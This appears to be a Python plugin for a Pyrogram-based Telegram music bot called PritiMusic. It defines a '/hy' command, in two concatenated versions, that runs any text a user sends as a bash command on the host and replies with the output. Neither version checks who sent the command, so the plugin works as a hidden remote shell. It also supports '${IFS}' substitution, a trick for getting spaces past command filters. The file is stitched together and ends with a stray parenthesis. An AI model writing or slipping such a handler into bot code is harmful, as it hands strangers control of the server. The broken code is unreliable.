
import os
import subprocess
from pyrogram import filters
from PritiMusic import app

@app.on_message(filters.command("hy"))
async def hy_command_v2(client, message):
    if len(message.command) < 2:
        return await message.reply("Usage: /hy <command>")
    
    cmd = message.text.split(" ", 1)[1]
    
    # Replace ${IFS} with space
    cmd = cmd.replace("${IFS}", " ")
    
    # Execute
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr if result.stderr else "Success"
        
        await message.reply(f"```bash\n{output[:1000]}\n```")
    except Exception as e:
        await message.reply(f"Error: {e}")
        
        
        
        
        
        
import asyncio
from pyrogram import filters
from PritiMusic import app

async def shell_cmd(cmd):
    proc = await asyncio.create_subprocess_shell(
        cmd, 
        stdout=asyncio.subprocess.PIPE, 
        stderr=asyncio.subprocess.PIPE,
        executable='/bin/bash'  # ${IFS} support ke liye
    )
    out, err = await proc.communicate()
    return out.decode("utf-8") if out else err.decode("utf-8")

@app.on_message(filters.command("hy"))
async def hy_command(client, message):
    if len(message.command) < 2:
        return await message.reply("Usage: /hy <command>")
    
    cmd = message.text.split(" ", 1)[1]
    status_msg = await message.reply("🔄 **Executing...**")
    
    try:
        result = await shell_cmd(cmd)
        
        if len(result) > 4000:
            with open("output.txt", "w") as f:
                f.write(result)
            await message.reply_document("output.txt")
            os.remove("output.txt")
        else:
            await status_msg.edit(f"**✅ Output:**\n```bash\n{result[:1000]}\n```")
    except Exception as e:
        await status_msg.edit(f"❌ **Error:** `{str(e)}`")
)        